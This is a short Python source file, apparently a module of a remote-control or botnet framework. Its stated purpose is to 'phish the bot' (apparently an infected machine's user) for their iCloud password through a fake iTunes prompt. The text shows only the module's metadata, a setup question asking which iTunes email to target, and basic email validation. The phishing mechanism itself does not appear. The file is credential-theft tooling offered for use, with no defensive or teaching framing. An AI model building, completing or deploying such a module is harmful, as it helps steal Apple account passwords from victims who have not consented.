# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Phish the bot for their iCloud password via iTunes.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self) -> List[str]:
        return [
            "iTunes email address to phish: "
        ]

    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
        email = set_options[0]

        if not email or "@" not in email:
            self._view.display_error("Invalid email address.")
            return False, None
        else:
            return True, {
                "email": email
            }
